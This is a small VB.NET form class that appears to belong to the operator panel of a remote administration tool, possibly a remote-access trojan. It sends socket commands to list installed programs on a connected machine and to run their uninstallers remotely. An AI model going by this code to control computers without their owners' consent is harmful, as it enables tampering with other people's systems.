Public Class InstalledPrograms
    Public sock As Integer

    Private Sub UninstallToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim sr$ = ListView1.FocusedItem.SubItems(5).Text
        If sr.EndsWith(".exe") Or sr.EndsWith(".msi") Then
            Main.S.Send(sock, "lDL" & Main.Yy & sr)
        Else
            MsgBox("Help : This is Not a program , it`s an update please find the program source uninstaller which contains pure executable path in silent uninstaller tab ", MsgBoxStyle.Critical)
        End If

    End Sub

    Private Sub InstalledPrograms_Load(sender As Object, e As System.EventArgs) Handles Me.Load

        Main.S.Send(sock, "xxx")
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click

        Main.S.Send(sock, "xxx")
    End Sub
End Class